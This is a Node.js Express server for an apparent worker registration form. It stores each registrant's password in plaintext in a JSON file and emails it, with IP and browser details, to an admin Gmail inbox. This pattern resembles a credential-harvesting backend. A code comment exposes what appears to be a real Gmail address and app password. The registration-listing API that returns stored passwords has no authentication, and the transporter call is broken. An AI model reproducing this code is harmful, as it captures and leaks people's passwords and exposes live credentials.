const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const fs = require('fs').promises;
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Email configuration
const transporter = nodemailer({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER, // uttamkumar95446@gmail.com
        pass: process.env.EMAIL_PASS  // glatcxakwcjnvltl
    }
});

// File to store registrations
const REGISTRATIONS_FILE = path.join(__dirname, 'registrations.json');

// Initialize registrations file if it doesn't exist
async function initializeRegistrationsFile() {
    try {
        await fs.access(REGISTRATIONS_FILE);
    } catch {
        await fs.writeFile(REGISTRATIONS_FILE, JSON.stringify([], null, 2));
    }
}

// Read registrations from file
async function readRegistrations() {
    try {
        const data = await fs.readFile(REGISTRATIONS_FILE, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        console.error('Error reading registrations:', error);
        return [];
    }
}

// Add basic auth in server.js
   app.use('/admin.html', (req, res, next) => {
       const auth = {login: 'admin', password: 'your-secure-password'};
       const b64auth = (req.headers.authorization || '').split(' ')[1] || '';
       const [login, password] = Buffer.from(b64auth, 'base64').toString().split(':');
       if (login && password && login === auth.login && password === auth.password) {
           return next();
       }
       res.set('WWW-Authenticate', 'Basic realm="401"');
       res.status(401).send('Authentication required.');
   });


// Write registrations to file
async function writeRegistrations(registrations) {
    try {
        await fs.writeFile(REGISTRATIONS_FILE, JSON.stringify(registrations, null, 2));
    } catch (error) {
        console.error('Error writing registrations:', error);
    }
}

// Send email notification
async function sendEmailNotification(registration) {
    // Skip if email credentials not configured
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
        console.log('Email credentials not configured. Skipping email notification.');
        return;
    }

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: process.env.ADMIN_EMAIL || process.env.EMAIL_USER,
        subject: '🔔 New Worker Registration Alert',
        html: `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background-color: #f5f5f5;">
                <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 10px 10px 0 0; text-align: center;">
                    <h1 style="color: white; margin: 0; font-size: 28px;">🎉 New Registration</h1>
                </div>
                
                <div style="background: white; padding: 30px; border-radius: 0 0 10px 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
                    <h2 style="color: #333; margin-top: 0;">Worker Details</h2>
                    
                    <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
                        <tr style="border-bottom: 1px solid #eee;">
                            <td style="padding: 12px 0; color: #666; font-weight: 600;">👤 Employee ID:</td>
                            <td style="padding: 12px 0; color: #333;"><strong>${registration.employeeId}</strong></td>
                        </tr>
                        <tr style="border-bottom: 1px solid #eee;">
                            <td style="padding: 12px 0; color: #666; font-weight: 600;">📝 Full Name:</td>
                            <td style="padding: 12px 0; color: #333;"><strong>${registration.fullName}</strong></td>
                        </tr>
                        <tr style="border-bottom: 1px solid #eee;">
                            <td style="padding: 12px 0; color: #666; font-weight: 600;">📧 Email:</td>
                            <td style="padding: 12px 0; color: #333;">${registration.email || 'Not provided'}</td>
                        </tr>
                        <tr style="border-bottom: 1px solid #eee;">
                            <td style="padding: 12px 0; color: #666; font-weight: 600;">🔒 Password:</td>
                            <td style="padding: 12px 0; color: #333;">${registration.password}</td>
                        </tr>
                        <tr style="border-bottom: 1px solid #eee;">
                            <td style="padding: 12px 0; color: #666; font-weight: 600;">⏰ Registration Time:</td>
                            <td style="padding: 12px 0; color: #333;">${new Date(registration.registrationTime).toLocaleString()}</td>
                        </tr>
                        <tr style="border-bottom: 1px solid #eee;">
                            <td style="padding: 12px 0; color: #666; font-weight: 600;">💻 Platform:</td>
                            <td style="padding: 12px 0; color: #333;">${registration.platform}</td>
                        </tr>
                        <tr>
                            <td style="padding: 12px 0; color: #666; font-weight: 600;">🌐 Browser:</td>
                            <td style="padding: 12px 0; color: #333; font-size: 11px;">${registration.userAgent}</td>
                        </tr>
                    </table>
                    
                    <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; margin-top: 20px;">
                        <p style="margin: 0; color: #666; font-size: 14px;">
                            ⚡ <strong>Action Required:</strong> Please verify this registration and proceed with the next steps.
                        </p>
                    </div>
                </div>
                
                <div style="text-align: center; padding: 20px; color: #999; font-size: 12px;">
                    <p>This is an automated notification from your Worker Registration System</p>
                    <p>© ${new Date().getFullYear()} Your Company Name</p>
                </div>
            </div>
        `
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log('Email notification sent successfully');
    } catch (error) {
        console.error('Error sending email:', error.message);
    }
}

// API Routes

// Register endpoint
app.post('/api/register', async (req, res) => {
    try {
        const { employeeId, fullName, email, password, registrationTime, userAgent, platform } = req.body;

        // Validation
        if (!employeeId || !fullName || !password) {
            return res.status(400).json({ 
                success: false, 
                error: 'Employee ID, Full Name, and Password are required' 
            });
        }

        // Read existing registrations
        const registrations = await readRegistrations();

        // Check if employee ID already exists
        const existingRegistration = registrations.find(r => r.employeeId === employeeId);
        if (existingRegistration) {
            return res.status(400).json({ 
                success: false, 
                error: 'Employee ID already registered' 
            });
        }

        // Create new registration
        const newRegistration = {
            id: Date.now().toString(),
            employeeId,
            fullName,
            email: email || '',
            password,
            registrationTime: registrationTime || new Date().toISOString(),
            userAgent: userAgent || '',
            platform: platform || '',
            ipAddress: req.ip || req.connection.remoteAddress,
            status: 'pending'
        };

        // Add to registrations
        registrations.push(newRegistration);
        await writeRegistrations(registrations);

        // Send email notification
        sendEmailNotification(newRegistration).catch(err => 
            console.error('Email notification error:', err)
        );

        // Return success
        res.json({ 
            success: true, 
            message: 'Registration successful',
            registrationId: newRegistration.id
        });

        console.log('New registration:', {
            employeeId: newRegistration.employeeId,
            fullName: newRegistration.fullName,
            time: new Date(newRegistration.registrationTime).toLocaleString()
        });

    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error' 
        });
    }
});

// Get all registrations (admin endpoint - secure this in production!)
app.get('/api/registrations', async (req, res) => {
    try {
        const registrations = await readRegistrations();
        res.json({ 
            success: true, 
            count: registrations.length,
            registrations 
        });
    } catch (error) {
        console.error('Error fetching registrations:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error' 
        });
    }
});

// Get single registration by ID
app.get('/api/registrations/:id', async (req, res) => {
    try {
        const registrations = await readRegistrations();
        const registration = registrations.find(r => r.id === req.params.id);
        
        if (!registration) {
            return res.status(404).json({ 
                success: false, 
                error: 'Registration not found' 
            });
        }

        res.json({ 
            success: true, 
            registration 
        });
    } catch (error) {
        console.error('Error fetching registration:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error' 
        });
    }
});

// Delete registration (admin endpoint)
app.delete('/api/registrations/:id', async (req, res) => {
    try {
        const registrations = await readRegistrations();
        const filteredRegistrations = registrations.filter(r => r.id !== req.params.id);
        
        if (registrations.length === filteredRegistrations.length) {
            return res.status(404).json({ 
                success: false, 
                error: 'Registration not found' 
            });
        }

        await writeRegistrations(filteredRegistrations);
        res.json({ 
            success: true, 
            message: 'Registration deleted successfully' 
        });
    } catch (error) {
        console.error('Error deleting registration:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error' 
        });
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ 
        success: true, 
        status: 'Server is running',
        timestamp: new Date().toISOString()
    });
});

// Serve the main HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ 
        success: false, 
        error: 'Internal server error' 
    });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ 
        success: false, 
        error: 'Endpoint not found' 
    });
});

// Initialize and start server
async function startServer() {
    try {
        await initializeRegistrationsFile();
        app.listen(PORT, () => {
            console.log(`
╔════════════════════════════════════════════════╗
║   🚀 Worker Registration Server Started        ║
║                                                ║
║   📍 Server: http://localhost:${PORT}          ║
║   🌐 Environment: ${process.env.NODE_ENV || 'development'}              ║
║   📧 Email: ${process.env.EMAIL_USER ? '✅ Configured' : '❌ Not configured'}          ║
║                                                ║
║   Press Ctrl+C to stop                         ║
╚════════════════════════════════════════════════╝
            `);
        });
    } catch (error) {
        console.error('Failed to start server:', error);
        process.exit(1);
    }
}

startServer();

module.exports = app;
